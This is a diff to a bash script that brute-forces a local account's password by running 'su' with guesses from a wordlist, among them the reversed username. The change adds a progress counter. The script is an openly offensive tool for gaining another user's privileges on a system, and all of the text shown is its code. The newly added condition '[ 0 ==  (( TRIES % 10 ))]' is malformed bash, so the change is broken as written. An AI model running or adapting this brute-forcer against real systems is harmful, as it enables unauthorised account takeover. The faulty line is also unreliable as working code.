@@ -11,6 +11,7 @@ THE USERNAME IS CASE SENSITIVE AND THIS SCRIPT DOES NOT CHECK IF THE PROVIDED US
 
 USER=""
 PLIST=""
+TRIES=0
 TIMEOUTPROC="0.7"
 SLEEPPROC="0.007"
 while getopts "h?u:t:s:l:" opt; do
@@ -46,6 +47,10 @@ su_brute_user_num (){
   su_try_pwd $USER `echo $USER | rev 2>/dev/null` &     #Try reverse username as password
   while read -r line
   	do
+		if [ 0 ==  (( TRIES % 10 ))]; then
+			echo Tried ${TRIES} pws until now...
+		fi
+		((TRIES++))
 		#echo trying ${line}...
 		su_try_pwd $USER ${line} & #Try TOP TRIES of passwords (by default 2000)
     		sleep $SLEEPPROC # To not overload the system
